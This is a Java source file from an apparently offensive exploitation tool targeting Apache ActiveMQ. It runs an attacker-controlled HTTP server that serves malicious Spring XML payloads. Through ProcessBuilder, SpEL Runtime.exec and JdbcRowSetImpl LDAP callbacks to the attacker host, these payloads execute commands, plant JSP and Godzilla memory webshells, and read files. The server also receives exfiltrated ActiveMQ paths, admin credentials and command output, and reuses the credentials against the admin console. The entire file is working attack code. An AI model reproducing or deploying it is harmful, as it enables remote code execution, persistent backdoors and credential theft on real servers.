package sonomon.server;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.text.ParseException;
import java.util.concurrent.Executors;
import sonomon.*;
import sonomon.deser.*;
import com.unboundid.util.Base64;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

public class HTTPServer {
    
	  public static HttpServer start() throws IOException {


		  HttpServer httpServer = HttpServer.create(new InetSocketAddress(Config.httpport), 0);
		  System.out.println("[+] Listening on 0.0.0.0:" + Config.httpport);
		  httpServer.createContext("/", new HttpHandler() {
			  
			  public void handle(HttpExchange httpExchange) throws IOException {
				  try {
					  System.out.println("[+] New HTTP Request From " + httpExchange.getRemoteAddress() + "  " + httpExchange.getRequestURI() + "  " + httpExchange.getRequestHeaders().get("User-Agent"));
					  String path = httpExchange.getRequestURI().getPath();
					  String requesturl = httpExchange.getRequestURI().toString();
					  
					  if (path.endsWith(".class")) {
						  HTTPServer.handleClassRequest(httpExchange);
					  } else if (path.endsWith(".xml")) {
						  HTTPServer.handleXMLRequest(httpExchange);
					  } else {
						  if (requesturl.startsWith("/?dir=")) {
							  String base64String = requesturl.substring(6);
							  try {
								base64String = Base64.decodeToString(base64String);
								System.out.println("[+] ActiveMQ路径为: " +base64String);
							  } catch (ParseException e) {
								  System.out.println("[*] ActiveMQ路径解析错误");
							  }
							  
						  } else if(requesturl.startsWith("/?user=")){
							  String base64String = requesturl.substring(7);
							  try {
								base64String = Base64.decodeToString(base64String);
								if (base64String.endsWith("admin")) {
									String web_user = base64String.substring(0, base64String.indexOf(":"));
									String web_pass = base64String.substring(base64String.indexOf(":")+2, base64String.indexOf(","));
									Config.setWeb_user(web_user);
									Config.setWeb_pass(web_pass);
									System.out.println("[+] ActiveMQ 8161 web账户为: " +web_user);
									System.out.println("[+] ActiveMQ 8161 web密码为: " +web_pass);
									try {
										Curl.doGet("http://"+Config.rhost+":8161/admin/", Base64.encode(web_user+":"+web_pass));
										System.out.println("[+] 8161/admin/请求成功");
									} catch (Exception e) {
										System.out.println("[-] 8161/admin/请求失败");
									}
								}
								
							  } catch (ParseException e) {
								  System.out.println("[*] ActiveMQ 8161 web账户解析错误");
							  }
						  } else if (requesturl.startsWith("/?echo=")){
							  String urlcode = requesturl.substring(7);
							  try {
								  // linux环境下base64回显似乎有点问题,于是用urldecode
								  urlcode = java.net.URLDecoder.decode(urlcode, "GBK");
								System.out.println("[+] 命令回显成功: " +urlcode);
							  } catch (Exception e) {
								  System.out.println("[*] 命令回显成功解析错误");
							  }
						  }

						  httpExchange.sendResponseHeaders(200, 0L);
						  httpExchange.close();

					  }						
				  } catch (IOException e) {
					  e.printStackTrace();
				  }
			  }
		  });
		  httpServer.setExecutor(Executors.newFixedThreadPool(10));
		  httpServer.start();
		  return httpServer;
		  }

	protected static void handleClassRequest(HttpExchange exchange) {
		//暂时不支持JNDI注入

	    exchange.close();
	}

	protected static void handleXMLRequest(HttpExchange exchange) throws IOException  {
		String payload = null;
		String classname = null;
		String classbase64 = null;
		String setALL = null;
	    String requestBody = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\r\n"
				+ "		<beans xmlns=\"http://www.springframework.org/schema/beans\"\r\n"
				+ "		       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n"
				+ "		       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\r\n"
				+ "		                        http://www.springframework.org/schema/beans/spring-beans.xsd\">\r\n";
		switch (Config.gadget) {
		case "wincmd":
			requestBody = requestBody+"<bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\r\n"
					+ "<constructor-arg>\r\n"
					+ "<list>\r\n"
					+ "<value>cmd</value>\r\n"
					+ "<value>/c</value>\r\n"
					+ "<value>"+Config.cmd+"</value>\r\n"
					+ "</list>\r\n"
					+ "</constructor-arg>\r\n"
					+ "</bean>\r\n"
					+ "</beans>";
		    exchange.sendResponseHeaders(200, requestBody.getBytes().length);
		    exchange.getResponseBody().write(requestBody.getBytes());
			break;
		case "linuxcmd":
			requestBody = requestBody+"<bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\r\n"
					+ "<constructor-arg>\r\n"
					+ "<list>\r\n"
					+ "<value>/bin/sh</value>\r\n"
					+ "<value>-c</value>\r\n"
					+ "<value>"+Config.cmd+"</value>\r\n"
					+ "</list>\r\n"
					+ "</constructor-arg>\r\n"
					+ "</bean>\r\n"
					+ "</beans>";
		    exchange.sendResponseHeaders(200, requestBody.getBytes().length);
		    exchange.getResponseBody().write(requestBody.getBytes());
			break;
		case "spelcmd":
			requestBody = requestBody+"<bean id=\"world\" class=\"java.lang.String\">\r\n"
					+ "<constructor-arg value=\"#{T (java.lang.Runtime).getRuntime().exec('"+Config.cmd+"')}\"/>\r\n"
					+ "</bean>\r\n"
					+ "</beans>";
		    exchange.sendResponseHeaders(200, requestBody.getBytes().length);
		    exchange.getResponseBody().write(requestBody.getBytes());
			break;
		case "spelecho":
			try {
				classname = "exp.CMDResponse";
				requestBody = requestBody+"<bean  class=\"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('exp.CMDResponse',T(org.springframework.util.Base64Utils).decodeFromString('"
						+Base64.encode(Payload.getClassBytes(classname,null))+"'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()."
						+ "test('"+Config.cmd+"')}\">\r\n"
						+ "    </bean>\r\n"
						+ "</beans>";
				//System.out.println(requestBody);
			} catch (Exception e1) {
				System.out.println("[-] spelecho.xml 生成失败");
			}
		    exchange.sendResponseHeaders(200, requestBody.getBytes().length);
		    exchange.getResponseBody().write(requestBody.getBytes());
			break;
		case "cb18":
			try {
				if(Deserialize.isDefaultPayload()) {
					payload = Config.cmd;
				} else {
					payload = Config.base64cmd;
				}
			} catch (Exception e) {
			}
			requestBody = requestBody+"<bean id=\"pd\" class=\"com.sun.rowset.JdbcRowSetImpl\">\r\n"
					+ "<property name=\"dataSourceName\" value=\"ldap://"+Config.lhost+":"+Config.ldapport+"/deser:"+Config.gadget+":"+payload+"\"></property>\r\n"
					+ "<property name=\"autoCommit\" value=\"true\"></property>\r\n"
					+ "</bean>\r\n"
					+ "</beans>";
		    exchange.sendResponseHeaders(200, requestBody.getBytes().length);
		    exchange.getResponseBody().write(requestBody.getBytes());
			break;
		case "cb19":
			try {
				if(Deserialize.isDefaultPayload()) {
					payload = Config.cmd;
				} else {
					payload = Config.base64cmd;
				}
			} catch (Exception e) {
			}
			requestBody = requestBody+"<bean id=\"pd\" class=\"com.sun.rowset.JdbcRowSetImpl\">\r\n"
					+ "<property name=\"dataSourceName\" value=\"ldap://"+Config.lhost+":"+Config.ldapport+"/deser:"+Config.gadget+":"+payload+"\"></property>\r\n"
					+ "<property name=\"autoCommit\" value=\"true\"></property>\r\n"
					+ "</bean>\r\n"
					+ "</beans>";
		    exchange.sendResponseHeaders(200, requestBody.getBytes().length);
		    exchange.getResponseBody().write(requestBody.getBytes());
			break;
		case "urldns":
			requestBody = requestBody+"<bean id=\"pd\" class=\"com.sun.rowset.JdbcRowSetImpl\">\r\n"
					+ "<property name=\"dataSourceName\" value=\"ldap://"+Config.lhost+":"+Config.ldapport+"/deser:"+Config.gadget+":"+Config.cmd+"\"></property>\r\n"
					+ "<property name=\"autoCommit\" value=\"true\"></property>\r\n"
					+ "</bean>\r\n"
					+ "</beans>";
		    exchange.sendResponseHeaders(200, requestBody.getBytes().length);
		    exchange.getResponseBody().write(requestBody.getBytes());
			break;
		case "spelclass":
			try {
			switch (Config.cmd) {
			case "cmdjsp":
				classname = "exp.ActivemqWebshell";
				classname = "exp.ActivemqWebshell";
		        setALL = "{ this.url = \""+Config.url+"\";\r\n"
		        		+ "    	this.jsp = \""+Config.cmd.replace("jsp", ".jsp")+"\";\r\n"
		        		+ "    	this.webshell = \""+Payload.getcmdjsp()+"\"; }";
				
				classbase64 = Base64.encode(Payload.getClassBytes(classname,Config.cmd));
				break;
			case "godzillajsp":
				classname = "exp.ActivemqWebshell";
		        setALL = "{ this.url = \""+Config.url+"\";\r\n"
		        		+ "    	this.jsp = \""+Config.cmd.replace("jsp", ".jsp")+"\";\r\n"
		        		+ "    	this.webshell = \""+Payload.getcmdjsp()+"\"; }";
				classbase64 = Base64.encode(Payload.getClassBytes(classname,Config.cmd));
				break;
			case "memcmd":
				classname = "exp.MemshellInject";
				classbase64 = Base64.encode(Payload.getClassBytes(classname,null));
				break;
			case "memgodzilla":
				classname = "exp.MemGodzilla";
				classbase64 = Base64.encode(Payload.getClassBytes(classname,null));
				break;
			case "readfile":
				classname = "exp.ActivemqReadFile";
				setALL = "{ this.url = \""+Config.url+"\";}";
				classbase64 = Base64.encode(Payload.getClassBytes(classname,setALL));
				break;
			default:
				classname = "exp.ActivemqEcho";
				setALL = "{ this.url = \""+Config.url+"\";\r\n"
	            		+ "    	this.cmd = \""+Config.base64cmd+"\"; }";
				classbase64 = Base64.encode(Payload.getClassBytes(classname, setALL));
				break;
			}
			} catch (Exception e) {
			}
			requestBody = requestBody+"    <bean id=\"ClassBase64Str\" class=\"java.lang.String\">\r\n"
					+ "        <constructor-arg value=\""+classbase64+"\">\r\n"
					+ "\r\n"
					+ "        </constructor-arg>\r\n"
					+ "    </bean>\r\n"
					+ "\r\n"
					+ "    <bean  class=\"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('"+classname+"',T(org.springframework.util.Base64Utils).decodeFromString(ClassBase64Str.toString()),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}\">\r\n"
					+ "    </bean>\r\n"
					+ "</beans>";
		    exchange.sendResponseHeaders(200, requestBody.getBytes().length);
		    exchange.getResponseBody().write(requestBody.getBytes());
			break;
		default:
		      exchange.sendResponseHeaders(200, 0L);
			break;
		}
		exchange.close();
	    
	    
	    
	}
	  
}
